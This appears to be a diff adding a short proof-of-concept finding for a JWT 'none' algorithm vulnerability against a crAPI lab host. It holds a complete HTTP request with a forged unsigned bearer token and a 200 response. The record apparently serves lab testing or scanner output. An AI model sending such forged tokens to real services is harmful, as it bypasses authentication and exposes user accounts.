@@ -1,0 +1,14 @@
+The target application is vulnerable to JWT None Algorithm attack.
+
+GET /identity/api/v2/user/dashboard HTTP/1.1
+Host: crapi.local:8888
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwiaWF0IjoxNzM3ODA5MjYyLCJleHAiOjE3Mzg0MTQwNjIsInJvbGUiOiJ1c2VyIn0.
+Accept: */*
+Referer: http://crapi.local:8888/dashboard
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+<Response [200]>
